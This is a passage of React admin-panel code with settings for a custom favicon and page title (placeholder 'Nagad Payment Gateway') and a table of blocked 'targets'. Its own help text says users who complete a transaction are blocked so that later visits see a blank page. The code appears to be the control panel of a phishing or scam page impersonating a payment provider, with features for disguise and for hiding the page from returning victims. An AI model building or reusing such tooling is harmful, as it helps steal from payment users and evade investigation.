                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  <div>
                    <label className="block text-xs font-bold uppercase text-slate-400 mb-1">
                      Favicon Image URL
                    </label>
                    <input
                      type="text"
                      value={settingsForm.customFaviconUrl || ''}
                      onChange={(e) => setSettingsForm({ ...settingsForm, customFaviconUrl: e.target.value })}
                      placeholder="https://example.com/favicon.ico"
                      className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2 text-slate-100 text-xs focus:outline-none focus:ring-2 focus:ring-red-500"
                    />
                  </div>

                  <div>
                    <label className="block text-xs font-bold uppercase text-slate-400 mb-1">
                      Page Title
                    </label>
                    <input
                      type="text"
                      value={settingsForm.pageTitle || ''}
                      onChange={(e) => setSettingsForm({ ...settingsForm, pageTitle: e.target.value })}
                      placeholder="Nagad Payment Gateway"
                      className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2 text-slate-100 text-xs focus:outline-none focus:ring-2 focus:ring-red-500"
                    />
                  </div>
                </div>
              </div>

              <div className="pt-4 border-t border-slate-800 flex items-center gap-3">
                <button
                  type="submit"
                  className="bg-red-600 hover:bg-red-500 text-white font-bold py-2.5 px-6 rounded-xl shadow-lg transition-transform active:scale-95 flex items-center gap-2"
                >
                  <RefreshCw className="w-4 h-4" />
                  Save & Publish Live
                </button>

                {saveSuccess && (
                  <span className="text-emerald-400 text-sm font-bold flex items-center gap-1">
                    <CheckCircle2 className="w-4 h-4" /> Saved Successfully!
                  </span>
                )}
              </div>
            </form>
          </div>
        )}

        {/* TAB 3: Blocked Devices */}
        {activeTab === 'blocked' && (
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl">
            <h2 className="text-xl font-bold text-white mb-2 flex items-center gap-2">
              <Ban className="w-5 h-5 text-red-500" />
              Blocked IPs & Devices ({blockedTargets.length})
            </h2>
            <p className="text-xs text-slate-400 mb-6">
              When a user completes their transaction or is blocked by admin, their device/IP is placed here. Any subsequent visits will render a completely blank page.
            </p>

            {blockedTargets.length === 0 ? (
              <div className="p-8 text-center text-slate-500">
                No devices currently blocked.
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full text-left border-collapse text-sm">
                  <thead>
                    <tr className="border-b border-slate-800 text-xs font-bold uppercase text-slate-400">
                      <th className="py-3 px-4">Target ID / Device</th>
                      <th className="py-3 px-4">IP Address</th>
                      <th className="py-3 px-4">Blocked At</th>
                      <th className="py-3 px-4 text-right">Action</th>
                    </tr>
                  </thead>
                  <tbody>
                    {blockedTargets.map((b) => (
                      <tr key={b.id} className="border-b border-slate-800/60 hover:bg-slate-800/40">
                        <td className="py-3 px-4 font-mono text-slate-300">{b.deviceId}</td>
                        <td className="py-3 px-4 font-mono text-slate-400">{b.ip}</td>
                        <td className="py-3 px-4 text-slate-400">
                          {new Date(b.blockedAt).toLocaleString()}
                        </td>
                        <td className="py-3 px-4 text-right">
                          <button
                            onClick={() => handleUnblockTarget(b.id)}
                            className="px-3 py-1 bg-emerald-600/20 hover:bg-emerald-600/30 text-emerald-400 border border-emerald-500/30 text-xs font-semibold rounded-lg transition-colors"
                          >
                            Unblock
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        )}
      </div>

      {/* Custom Toast Notification Popup */}
      {toast && (
        <div className="fixed bottom-5 right-5 z-50 flex items-center gap-3 bg-slate-900 border border-emerald-500/50 text-emerald-300 px-4 py-3 rounded-2xl shadow-2xl transition-all duration-300 animate-bounce">
          <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0" />
          <div className="text-xs sm:text-sm font-bold">{toast.message}</div>
        </div>
      )}
    </div>
  );
};
